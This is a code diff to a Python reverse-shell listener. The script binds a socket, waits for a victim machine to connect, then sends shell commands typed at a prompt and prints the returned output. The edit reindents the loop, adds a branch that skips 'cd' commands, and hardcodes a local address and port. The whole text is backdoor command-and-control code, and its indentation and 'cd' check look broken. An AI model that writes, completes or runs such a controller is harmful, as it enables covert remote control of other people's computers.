@@ -23,13 +23,15 @@ def reliable_recv():
 
 def shell():
 	while True:
-        	command = input("* Shell#~%s: " % str(ip))
-        	reliable_send(command)
-        	if command == "q":
+		command = input("* Shell#~%s: " % str(ip))
+		reliable_send(command)
+		if command == "q":
                 	break
-        	else:
-                	result = reliable_recv()
-                	print (result)
+		elif command[:2] == "cd" and len(command) > 1:
+					continue
+		else:
+				result = reliable_recv()
+				print (result)
 
 def server ():
 	global s
@@ -37,7 +39,7 @@ def server ():
 	global target
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-	s.bind(("ip",port))
+	s.bind(("127.0.0.1",54321))  #ip of host + desired port
 	s.listen(5)
 	print ("LISTENING FOR INCOMING CONNECTIONS")
 	target, ip = s.accept()
